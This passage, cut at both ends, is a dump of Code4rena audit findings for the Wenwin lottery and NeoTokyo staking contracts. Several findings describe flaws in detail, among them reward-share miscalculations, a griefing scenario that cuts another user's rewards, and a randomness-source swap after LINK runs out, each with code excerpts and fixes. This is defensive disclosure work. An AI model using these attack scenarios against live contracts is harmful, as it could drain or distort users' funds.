set to 52 as the Lottery expects the drawPeriod to be 1 week.  The documentation states that a user has 1 year to claim his winnings https://docs.wenwin.com/wenwin-lottery/the-game/prizes#claiming-prizes  If the drawPeriod is set < 7 days it will break this and the user has less time than 1 year to claim his price.  For example if the drawPeriod will be 1 day (86400) there should be 365 DRAWS_PER_YEAR, but as it is fixed to 52, the user only has 52 days to claim his rewards and after that it's not possible anymore.  ## Proof of Concept If the drawPeriod is not set to 7 days (604800 seconds) it will return a unclaimedJackpot early and also will prevent user to claim their winnings.  ```solidity File: src/Lottery.sol 159:     function claimable(uint256 ticketId) external view override returns (uint256 claimableAmount, uint8 winTier) { 160:         TicketInfo memory ticketInfo = ticketsInfo[ticketId]; 161:         if (!ticketInfo.claimed) { 162:             uint120 _winningTicket = winningTicket[ticketInfo.drawId]; 163:             winTier = TicketUtils.ticketWinTier(ticketInfo.combination, _winningTicket, selectionSize, selectionMax); 164:             if (block.timestamp <= ticketRegistrationDeadline(ticketInfo.drawId + LotteryMath.DRAWS_PER_YEAR)) { 165:                 claimableAmount = winAmount[ticketInfo.drawId][winTier]; 166:             } 167:         } 168:     }  File: src/Lottery.sol 271:     function returnUnclaimedJackpotToThePot() private { 272:         if (currentDraw >= LotteryMath.DRAWS_PER_YEAR) { 273:             uint128 drawId = currentDraw - LotteryMath.DRAWS_PER_YEAR; 274:             uint256 unclaimedJackpotTickets = unclaimedCount[drawId][winningTicket[drawId]]; 275:             currentNetProfit += int256(unclaimedJackpotTickets * winAmount[drawId][selectionSize]); 276:         } 277:     } ```  ## Tools Used manual review  ## Recommended Mitigation Steps Use a fixed `drawPeriod` of 604800 or change the logic in the function `claimable` and `returnUnclaimedJackpotToThePot` to use a calculated DRAWS_PER_YEAR variable like the following:  ```solidity function getDrawsPerYear() public view returns (uint128) {     return uint128(365 days / drawPeriod); } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/405", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-12"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/zaskoh-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/401", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-15"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/tnevler-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/395", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/Udsen-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/377", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-19"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/martin-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/356", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-22"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/SAAJ-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/355", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-23"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/peanuts-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/336", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-10"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/descharre-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/331", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-26"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/catellatech-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/308", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-28"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/0xAgro-Q.md)."}, {"title": "`Staking#getReward` can be blocked when using `rewardsToken` that reverts on zero transfer", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/293", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-31"], "target": "2023-03-wenwin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/staking/Staking.sol#L91 https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/staking/Staking.sol#L97   # Vulnerability details  ## Impact  Getting rewards from staking Lottery token can be blocked if used in conjunction with a reward token that does not support zero value transfer. Such token is https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers   ## Proof of Concept  Lets examine the following scenario:  For the current draw we have accumulated some non zero rewards.  1. User A calls for the first time `getReward`   https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/staking/Staking.sol#L91  This user has earned some reward by staking so the call proceeds internally by calling `Lottery#claimRewards(LotteryRewardType.STAKING)` which will transfer **all accumulated rewards to the staking contract at once** so on next user claim this transferred value can be distributed from the staking contract to the claiming users.  https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/staking/Staking.sol#L97  `claimRewards` internally calls `dueTicketsSoldAndReset` which will for the first time return `claimedAmount` value that is in our scenario greater than zero and will succeed to transfer this value to the staking (which is the current `beneficiary`) contract with:  ```solidity rewardToken.safeTransfer(beneficiary, claimedAmount); ``` From the staking contract will go directly to the user A that claimed its reward  https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/staking/Staking.sol#L98  2. When a second user B comes around and tries to call `getReward` it will revert because   `dueTicketsSoldAndReset` has already reset the `claimedAmount` to zero the first time and now will fail when trying to transfer zero amount from the reward token to the staking contract.  ## Tools Used Manual review  ## Recommended Mitigation Steps  ```diff  function claimRewards(LotteryRewardType rewardType) external override returns (uint256 claimedAmount) {         // audit-ok : someone (staking contract) need/is to call/ing this to get staking reward         // audit-ok : is recipent correct => it is         address beneficiary = (rewardType == LotteryRewardType.FRONTEND) ? msg.sender : stakingRewardRecipient;         claimedAmount = LotteryMath.calculateRewards(ticketPrice, dueTicketsSoldAndReset(beneficiary), rewardType);          emit ClaimedRewards(beneficiary, claimedAmount, rewardType); + +       if (claimedAmount > 0) +           rewardToken.safeTransfer(beneficiary, claimedAmount);  -        rewardToken.safeTransfer(beneficiary, claimedAmount);     } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/275", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-12"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/hunter_w3b-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/261", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-13"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/Pheonix-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/259", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-35"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/Bason-Q.md)."}, {"title": "[M-4] Running out of LINK tokens prevents generating random numbers from Chainlink.", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/255", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-03-wenwin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-wenwin/blob/a260ecba74720c631ab06ecdd67167317b976b60/src/RNSourceController.sol#L89-L104   # Vulnerability details  ## Impact  The protocol uses the direct funding method of VRF V2. This method requires that the consuming contracts have sufficient LINK tokens before they request randomness. If there are not enough LINK tokens, the request will be reverted. This creates an attack vector: If the lottery contracts run out of LINK tokens, after maxFailedAttempts, a new untrusted source can be swapped in. This poses a risk of manipulating the random source.  https://github.com/code-423n4/2023-03-wenwin/blob/a260ecba74720c631ab06ecdd67167317b976b60/src/RNSourceController.sol#L89-L104  https://docs.chain.link/vrf/v2/direct-funding          Make sure that your consuming contracts are funded with enough LINK tokens to cover the transaction costs. If the consuming contract doesn\u2019t have enough LINK tokens, your request will revert.  ## Proof of Concept   ## Tools Used  Manually Chainlink docs  ## Recommended Mitigation Steps  Adding mechanism to evaluate the LINK token balance and refill it.   One possible mechanism to evaluate and refill the LINK token balance is to check it after each draw. If it falls below a certain level, the Lottery contract can call UNISWAP to swap some DAI for LINK and record the transaction as an expense that reduces the lottery net profit."}, {"title": "[M-3] Locked Staked Tokens can be withdraw before `depositDeadline`", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/254", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-03-wenwin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-wenwin/blob/a260ecba74720c631ab06ecdd67167317b976b60/src/staking/StakedTokenLock.sol#L39-L41   # Vulnerability details  ## Impact  According to the design and communication to investors, the tokens that are staked will be locked for a certain period before they can be released to the owner account. However, the owner can still withdraw the tokens if the `block.timestamp` exceeds the `depositDeadline`.  We do not suspect that the owner is a malicious account. But if the code does not match the specifications and documents in a contract that holds critical assets, it can raise questions about potential risks from investors and holders of LOT.   ## Proof of Concept  If the `block.timestamp < depositDeadline`, owner can still withdraw the tokens. https://github.com/code-423n4/2023-03-wenwin/blob/a260ecba74720c631ab06ecdd67167317b976b60/src/staking/StakedTokenLock.sol#L39-L41  ## Tools Used  Manual  ## Recommended Mitigation Steps  Change that if the block.timestamp before releasing period, cannot withdraw tokens.  ```diff -    if (block.timestamp > depositDeadline && block.timestamp < depositDeadline + lockDuration) {  +    if (block.timestamp < depositDeadline + lockDuration) {            revert LockPeriodOngoing();     } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/249", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-37"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/cryptostellar5-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/238", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-39"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/erictee-Q.md)."}, {"title": "Centralization Risk on the mint function, LotteryToken.sol#L23", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/215", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-41"], "target": "2023-03-wenwin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/LotteryToken.sol#L23   # Vulnerability details  ## Impact LotteryToken is the native token of Wenwin Lottery. It can be staked (stakers receive a portion of ticket sales) and referral rewards.   considering that this token is the native token of this project, the security of the tokens and economic design is very important for this token.  In the LotteryToken.sol#L23 the role owner has authority over the mint function. Any compromise to the owner account may allow the hacker to take advantage of this authority and mint any LotteryToken to any address.  ## Proof of Concept In the LotteryToken.sol#L23 the role owner has authority over the mint function. Any compromise to the owner account may allow the hacker to take advantage of this authority and mint any LotteryToken to any address. function mint(address account, uint256 amount) external override {  if (msg.sender != owner) {  revert UnauthorizedMint();  }  _mint(account, amount);  }  Unauthorized token minting can cause the loss of users' funds and the destruction of the project.  ## Tools Used Manually  ## Recommended Mitigation Steps strongly recommend to use multi-sign to prevent a single point of failure due to the private key compromised."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/210", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-40"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/glcanvas-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/157", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-19"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/rokso-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/139", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "edited-by-warden", "G-21"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/Rolezn-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/98", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-23"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/ReyAdmirado-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/94", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-24"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/yongskiws-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-25"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/matrix_0wl-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/84", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-26"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/JCN-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/78", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-27"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/Sathish9098-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/73", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-51"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/0xnev-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/31", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-53"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/georgits-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/17", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-54"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/Madalad-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/15", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-34"], "target": "2023-03-wenwin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-wenwin-findings/blob/main/data/Madalad-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/459", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-01"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/Udsen-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/456", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/joestakey-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/442", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-02"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/nadin-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/441", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-05"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/Deathstore-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/429", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-03"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/leopoldjoy-G.md)."}, {"title": "Updating a pool's total points doesn't affect existing stake positions for rewards calculation", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/423", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-03-neotokyo-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1386-L1393   # Vulnerability details  ## Impact  Staking rewards are calculated based on the user's share of total points in the corresponding asset pool, this is the sum of the points associated to the staker's positions divided by the total points from all positions in the pool. We can see this calculation in the `getPoolReward` function:  https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1386-L1393  ```solidity // Return final shares. unchecked {     uint256 share = points * _PRECISION / pool.totalPoints * totalReward;     uint256 daoShare = share * pool.daoTax / (100 * _DIVISOR);     share /= _PRECISION;     daoShare /= _PRECISION;     return ((share - daoShare), daoShare); } ```  However, note that `pool.totalPoints` is the current value of the pool's total point at the time the function `getPoolReward` is called. It isn't related to the time the user staked their position, or isn't affected in any way by other stake/unstake actions from potentially other users.  This means that any action that modifies the pool's total points (stake or unstake) won't affect current staking positions, as previously opened staking positions won't accrue their rewards correctly. For stake actions, it will cause rewards from existing staking positions to be reduced, as their calculation of the shares now divided by a higher `pool.totalPoints` value. From unstake actions, it will cause rewards from existing staking positions to be incorrectly increased, as the calculation of the shares is now divided by a lower `pool.totalPoints` value. See section \"Proof of Concept\" for a more detailed walkthrough.  In a similar way, this could also be used by a griefer to intentionally harm another user. As the `getReward` function present in the `BYTES2` contract is permissionless (anyone can call this on behalf of an arbitrary account), a bad actor can call this when the pool's total points is high, which will have the effect of reducing the user rewards.  ## Proof of Concept  Let's assume the pool is empty. Alice stakes at `t1` an asset worth 100 points and Bob stakes at `t2` another asset worth 100 points. In order to simplify the examples, let's also consider that all periods fall in the same window, thus having a constant reward rate.  ### Alice claims after Bob stakes  In this scenario, Alice claims her rewards in `t3` after Bob stakes. She will get less rewards from the `[t1, t2]` period, as the calculation will consider the entire period `[t1, t3]` and calculate the shares using 200 points. Here the correct way would be to calculate the period `[t1, t2]` using 100 total points, and the period `[t2, t3]` using 100 total points.  1. Alice stakes at `t1` and gets 100 points. Total points is 100. 2. Bob stakes at `t2` and gets 100 points. Total points is 200. 3. Alice claims rewards at `t3`. She will get less rewards since the calculation will be done using 200 points.  ### Alice and Bob stake at same time  Here, `t1 == t2` and Bob and Alice stake at the same time. Alice unstakes at `t3` and Bob claims rewards at `t4`. In this case, Bob will get more rewards, as the calculation will consider the entire period `[t1, t4]` and calculate the shares using 100 points. Here the correct way would be to calculate the period `[t1, t3]` using 200 total points, and the period `[t3, t4]` using 100 total points.  1. Alice and Bob stake at `t1 == t2` and each one gets 100 points. Total points is 200. 2. Alice unstakes at `t3`. Total points is 100. 3. Bob claims rewards at `t4`. He will get more rewards since the calculation will be done using 100 points.  ### Griefer intentionally claims rewards of Alice  As described in the previous section, a bad actor can intentionally claim the rewards of another user at a time the pool has a high value for total points, since this call as this is a permissionless action.  1. Alice stakes at `t1` and gets 100 points. Total points is 100. 2. Bob stakes at `t2` and gets 100 points. Total points is 200. 3. Bad actor claims rewards of Alice at `t3`. She will get less rewards since the calculation will be done using 200 points.  ## Recommendation  Rewards calculation should track reward rate according to modifications in the pool's total points caused by stake or unstake actions.   My recommendation for a performant solution would be to follow [this staking example](https://solidity-by-example.org/defi/staking-rewards/) or [the full Staking contract from Synthetix](https://github.com/Synthetixio/synthetix/blob/develop/contracts/StakingRewards.sol). The principal idea here is that every action that affects rewards triggers the `updateReward` modifier, which updates the `rewardPerTokenStored` variable that tracks the reward amount per staked token. A similar idea could be adapted to track the reward per point for the current contract. Stake and unstake actions should update this variable before modifying the pool's total points. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/421", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-04"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/Aymen0909-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/418", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-05"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/0x1f8b-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/413", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-06"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/hunter_w3b-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/412", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-07"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/c3phas-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/411", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-08"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/carlitox477-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/406", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-09"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/ulqiorra-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/398", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-10"], "target": "2023-03-neotokyo-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/atharvasama-G.md)."}, {"title": "Users staking BYTES will accrue 100 times more points than expected because of a miscalculation in `_stakeBytes`", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/389", "labels": ["bug", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "Q-15"], "target": "2023-03-neotokyo-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L203 https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L10617-L1080 https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1085-L1101   # Vulnerability details  ## Impact  A magnitude of 100 times will completely break the balance on the rewards system calculation, as staking S1 Citizens, S2 Citizens and LP tokens will accrue 100 times less in comparison, and ultimately those users will only be able to claim a fraction of the rewards compared to the ones staking BYTES.  This will break the rewards system, and greatly discourage users from staking LP tokens, or from staking their Citizens without staking BYTES.  ## Proof of Concept  The `_stakeBytes()` function for staking BYTES with S1 and S2 Citizens has an error when calculating the `bonusPoints`.  As per the [documentation](https://github.com/code-423n4/2023-03-neotokyo/tree/main#overview): \"Staking participants may also stake BYTES 2.0 tokens into their S1 or S2 Citizens in order to boost the points weight of those Citizens at a rate of 200 BYTES per point.\"  This means `200 BYTES per point`.  The code defines it as: `bonusPoints = (amount * 100 / _BYTES_PER_POINT)`  Which translates to: `bonusPoints = amount * 100 / (200 * 1e18)`  This results in the miscalculation that it only needs: `2 BYTES per point`, which is 100 times lower than expected.  This may be due to some confusion between \"base points\" and \"basis points\". [1 base point = 100 basis points](https://discord.com/channels/810916927919620096/1082395240566104216/1084307565145509980).  `bonusPoints` are added to both `citizenStatus.points` and `pool.totalPoints`. So they must be expressed in base points.  Examples:  ```solidity     // For 200 BYTES `amount == 200 * 1e18`     // Expected: 1 point     // Result: 100 points     bonusPoints = (amount * 100 / _BYTES_PER_POINT);     bonusPoints = amount * 100 / (200 * 1e18);     bonusPoints = (200 * 1e18) * 100 / (200 * 1e18);     bonusPoints = 100; ```  ```solidity     // For 2 BYTES: `amount == 2 * 1e18`     // Expected: 0 points     // Result: 1 point     bonusPoints = (amount * 100 / _BYTES_PER_POINT);     bonusPoints = amount * 100 / (200 * 1e18);     bonusPoints = (2 * 1e18) * 100 / (200 * 1e18);     bonusPoints = 1; ```  References:  The definition of `_BYTES_PER_POINT`:  ```solidity // File: NeoTokyoStaker.sol  202: /// The number of BYTES needed to get one point in BYTES staking calculations. 203: uint256 constant private _BYTES_PER_POINT = 200 * 1e18; ```  [Link to Code](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L203)  `bonusPoints` are miscalculated in `_stakeBytes()` and added to the user and the S1 and S2 pool:  ```solidity // File: NeoTokyoStaker.sol // Function: _stakeBytes() // S1 Citizen  L1061:           StakedS1Citizen storage citizenStatus = stakedS1[msg.sender][citizenId];  L1075:                              PoolData storage pool = _pools[AssetType.S1_CITIZEN];  L1077:    uint256 bonusPoints = (amount * 100 / _BYTES_PER_POINT); // @audit wrong calculation L1078:    citizenStatus.stakedBytes += amount; L1079:    citizenStatus.points += bonusPoints; // @audit accrued more points than expected L1080:    pool.totalPoints += bonusPoints; // @audit imbalance in the pool total points ```  [Link to Code](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L10617-L1080)  ```solidity // File: NeoTokyoStaker.sol // Function: _stakeBytes() // S2 Citizen  L1085:               StakedS2Citizen storage citizenStatus = stakedS2[msg.sender][citizenId];  L1096:                              PoolData storage pool = _pools[AssetType.S2_CITIZEN];  L1098:    uint256 bonusPoints = (amount * 100 / _BYTES_PER_POINT); // @audit wrong calculation L1099:    citizenStatus.stakedBytes += amount; L1100:    citizenStatus.points += bonusPoints; // @audit accrued more points than expected L1101:    pool.totalPoints += bonusPoints; // @audit imbalance in the pool total points ```  [Link to Code](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1085-L1101)  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Fix the calculation by removing the `* 100`:  ```diff // File: NeoTokyoStaker.sol // Function: _stakeBytes()  -    uint256 bonusPoints = (amount * 100 / _BYTES_PER_POINT); +    uint256 bonusPoints = amount / _BYTES_PER_POINT; ```  Check that the calculation for LP tokens is done 